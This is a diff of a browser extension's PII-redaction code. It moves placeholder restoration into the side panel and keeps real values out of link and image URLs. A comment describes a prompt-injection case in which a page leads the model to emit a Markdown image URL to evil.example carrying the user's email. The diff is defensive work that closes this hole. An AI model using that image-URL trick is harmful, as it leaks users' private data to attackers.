@@ -436,10 +436,11 @@ const RULES = [
 //
 // Within one request every distinct value gets its own numbered placeholder
 // ([EMAIL#1], [EMAIL#2], [PHONE#1] ...), the same value always gets the same one,
-// and the mapping lives only in memory in this session object. It is never sent
-// anywhere: it is used to put the real values back into the model's reply
-// (restorePlaceholders / PlaceholderRestorer), so a translation or summary shows
-// the user's own email address, not "[EMAIL]".
+// and the mapping lives in memory in this session object. It never goes to a
+// provider or to Tavily; the only place it is sent is the extension's own side
+// panel (over the runtime port), which uses it to show the user their own values
+// again (see restoreInHtmlText / restoreWithMap), so a translation or summary
+// shows the user's own email address, not "[EMAIL#1]".
 export function createRedactionSession() {
   // reserved: numbers already used by literal placeholder-shaped text in the
   // source, so a generated placeholder never reuses one and the restorer can
@@ -563,43 +564,97 @@ export function restoreNamePlaceholders(text, session) {
   return text.replace(/\[NAME#\d+\]/g, (token) => session.byPlaceholder.get(token) ?? token);
 }
 
-// Streaming version: a placeholder can be split across two chunks
-// ("... [EMA" + "IL#1] ..."), so a possible partial placeholder at the end of
-// the buffer is held back until it is complete (or clearly is not one).
-export class PlaceholderRestorer {
-  constructor(session, emit) {
-    this.session = session;
-    this.emit = emit;
-    this.buf = "";
-  }
+// ---------------------------------------------------------------------------
+// Restoring placeholders in what the USER SEES (done by the side panel).
+//
+// The worker no longer puts real values back into the streamed reply. It used
+// to, before Markdown was parsed, so a page that talked the model into writing
+// ![x](https://evil.example/?d=[EMAIL#1]) got a URL holding the real address,
+// and the panel then offered to fetch / open exactly that URL. Now the reply
+// travels with its placeholders, together with the placeholder -> value map
+// (extension-internal, over the port), and the panel restores values only
+//   - in TEXT (text nodes of the rendered reply, plain-text translations, the
+//     copy button), never in a link target or an image URL;
+//   - in an image's alt text (display text, not an address).
+// A URL that holds a placeholder keeps it literally, so nothing private can
+// leave through a click.
+// ---------------------------------------------------------------------------
 
-  push(delta) {
-    if (!this.session || !this.session.byPlaceholder.size) {
-      if (delta) this.emit(delta);
-      return;
-    }
-    this.buf += delta;
-    const open = this.buf.lastIndexOf("[");
-    let hold = this.buf.length;
-    if (open >= 0 && this.buf.length - open <= 32 && !this.buf.includes("]", open)) {
-      hold = open > 0 && this.buf[open - 1] === "\\" ? open - 1 : open;
-    } else if (this.buf.endsWith("\\")) {
-      // A trailing backslash may be the escape of a "[" that arrives in the
-      // NEXT chunk (backslash + "[PHONE#2\]"): emitting it now would leave a
-      // stray backslash in the output when the escaped placeholder restores.
-      // Holding it costs one chunk of latency; flush() releases it verbatim.
-      hold = this.buf.length - 1;
-    }
-    const ready = this.buf.slice(0, hold);
-    this.buf = this.buf.slice(hold);
-    if (ready) this.emit(restorePlaceholders(ready, this.session));
-  }
+const PLACEHOLDER_KEY_RE = /^\[[A-Z_]+#\d+\]$/;
+const MAX_PII_MAP_ENTRIES = 1000;
+const MAX_PII_VALUE_CHARS = 2000;
 
-  flush() {
-    const rest = this.buf;
-    this.buf = "";
-    if (rest) this.emit(restorePlaceholders(rest, this.session));
+// The session's placeholder -> original map as a plain object (for the port).
+export function placeholderMapFromSession(session) {
+  if (!session || !session.byPlaceholder?.size) return null;
+  return Object.fromEntries(session.byPlaceholder);
+}
+
+// Validates a map that came from the port or from storage / a backup.
+export function sanitizePiiMap(raw) {
+  if (!raw || typeof raw !== "object" || Array.isArray(raw)) return null;
+  const out = {};
+  let n = 0;
+  for (const [key, value] of Object.entries(raw)) {
+    if (n >= MAX_PII_MAP_ENTRIES) break;
+    if (!PLACEHOLDER_KEY_RE.test(key) || typeof value !== "string" || value.length > MAX_PII_VALUE_CHARS) continue;
+    out[key] = value;
+    n++;
   }
+  return n ? out : null;
+}
+
+// The part of `map` that `text` needs (its placeholders, and those inside their
+// values), so a stored message keeps only what it uses.
+export function usedPiiMap(text, map) {
+  if (!map || typeof text !== "string" || !text.includes("[")) return null;
+  const out = {};
+  let frontier = text;
+  for (let depth = 0; depth < 4 && frontier; depth++) {
+    let next = "";
+    for (const m of frontier.matchAll(PLACEHOLDER_RE)) {
+      const key = `[${m[1]}#${m[2]}]`;
+      if (key in out || !(key in map)) continue;
+      out[key] = map[key];
+      next += `${map[key]}\n`;
+    }
+    frontier = next;
+  }
+  return Object.keys(out).length ? out : null;
+}
+
+function sessionFromMap(map) {
+  return { byPlaceholder: new Map(Object.entries(map)) };
+}
+
+// Plain-text restore (a translation shown with textContent, the copy source,
+// history sent back to the worker - which redacts it again).
+export function restoreWithMap(text, map) {
+  if (!map || typeof text !== "string" || !text.includes("[")) return text;
+  return restorePlaceholders(text, sessionFromMap(map));
+}
+
+const HTML_TEXT_ESCAPES = { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" };
+const escapedSessions = new WeakMap(); // map -> session whose values are HTML-escaped
+
+// Restores placeholders in the TEXT NODES of an HTML string produced by
+// markdownToHtml(): every "<" of the reply's own text is already "&lt;", so a
+// literal "<...>" in the string is a tag the renderer generated. Tags are left
+// alone, with one exception: an image's alt text (shown as a label, never
+// requested). href / src - every address - keep their placeholders. Restored
+// values are HTML-escaped, so a value can never become markup.
+export function restoreInHtmlText(html, map) {
+  if (!map || typeof html !== "string" || !html.includes("[")) return html;
+  let session = escapedSessions.get(map);
+  if (!session) {
+    session = { byPlaceholder: new Map(Object.entries(map).map(([k, v]) => [k, v.replace(/[&<>"']/g, (c) => HTML_TEXT_ESCAPES[c])])) };
+    escapedSessions.set(map, session);
+  }
+  if (!session.byPlaceholder.size) return html;
+  return html.replace(/<[^>]*>|[^<]+/g, (segment) => {
+    if (segment[0] !== "<") return restorePlaceholders(segment, session);
+    return segment.replace(/(\balt=")([^"]*)(")/, (_m, open, value, close) => `${open}${restorePlaceholders(value, session)}${close}`);
+  });
 }
 
 // Single choke point for EVERYTHING in an ASK payload that can leave the
@@ -607,7 +662,7 @@ export class PlaceholderRestorer {
 // fields). Every string leaf is redacted, so a field added to the payload later
 // (e.g. factCheck.selectedText, which previously bypassed the filter) is
 // covered by default. Structural keys and binary image fields are left alone.
-const STRUCTURAL_KEYS = new Set(["role", "type", "id", "requestId", "modelId", "tabId"]);
+const STRUCTURAL_KEYS = new Set(["role", "type", "id", "requestId", "modelId", "tabId", "kind"]);
 const NON_TEXT_KEYS = new Set(["images", "dataUrl", "imageUrls", "pageScreenshot"]);
 
 function walkText(value, key, visit) {
